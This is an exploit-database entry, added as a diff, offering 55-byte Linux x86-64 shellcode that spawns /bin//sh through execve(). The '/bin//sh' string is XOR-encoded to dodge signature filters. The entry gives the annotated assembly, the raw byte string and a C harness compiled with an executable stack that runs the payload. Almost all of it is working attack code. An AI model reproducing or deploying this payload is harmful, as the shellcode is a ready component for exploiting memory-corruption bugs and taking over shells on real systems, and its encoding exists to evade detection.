@@ -1,0 +1,55 @@
+id: 39134
+date: 11/09/2023
+title: Linux/x64 - create a shell with execve() sending argument using XOR (/bin//sh) Shellcode (55 bytes)
+author: 0x177git
+cves: 
+
+# Exploit Title: Linux-x64 - create a shell with execve() sending argument using XOR (/bin//sh) [55 bytes]
+
+# Shellcode Author: Alexys (0x177git)
+
+# Tested on: Linux (x86_64)
+
+# Shellcode Description: creating a new process using execve() syscall sending bin//sh as argument | (encrypted using XOR operation was QWORD size (/bin - //sh)) 
+
+# Original code: https://github.com/0x177git/xor-encrypted-execve-sh
+
+---- Assembly code ----
+
+  section .text
+
+  global _start
+ 
+_start:
+  xor eax, eax
+  xor edx, edx ; clear rdx (argv on execve() protoype)
+  mov qword [rsp-32], 0x7466684b ; 
+  mov qword [rsp-28],0x60650b1d  ; encrypted(/bin//sh) 0x60,  0x65,  0xb,  0x1d,  0x74,  0x66,  0x68,  0x4b 
+  xor qword [rsp-32], 0x1a0f0a64
+  xor qword [rsp-28], 0x08162432  ; passwd 0x8, 0x16, 0x24, 0x32, 0x1a, 0xf, 0xa, 0x64 
+  lea rdi, [rsp-32]
+  push rax ; end of string 
+  push rdi ; send string to stack 
+  mov rsi, rsp ; send address of RSP to rsi  ->  (arg on linux syscall architecture convection) || execve(rsi, rdx)
+ 
+  ; call execve()
+ mov al, 0x3b
+
+  syscall 
+
+    - - - shellcode execution using stack in c (gcc -z execstack  shellcode.c -o shellcode )  - - - - 
+
+
+ /* 
+"\x48\x31\xc0\x48\x31\xd2\x48\xc7\x44\x24\xe0\x4b\x68\x66\x74\x48\xc7\x44\x24\xe4\x1d\x0b\x65\x60\x48\x81\x74\x24\xe0\x64\x0a\x0f\x1a\x48\x81\x74\x24\xe4\x32\x24\x16\x08\x48\x8d\x7c\x24\xe0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
+
+*/
+
+void main ()
+{
+  const char  shellcode[] = "\x48\x31\xc0\x48\x31\xd2\x48\xc7\x44\x24\xe0\x4b\x68\x66\x74\x48\xc7\x44\x24\xe4\x1d\x0b\x65\x60\x48\x81\x74\x24\xe0\x64\x0a\x0f\x1a\x48\x81\x74\x24\xe4\x32\x24\x16\x08\x48\x8d\x7c\x24\xe0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
+    void(*f)() = (void(*)()) shellcode;
+     f();
+}
+
+#  0day.today [2023-11-14]  #
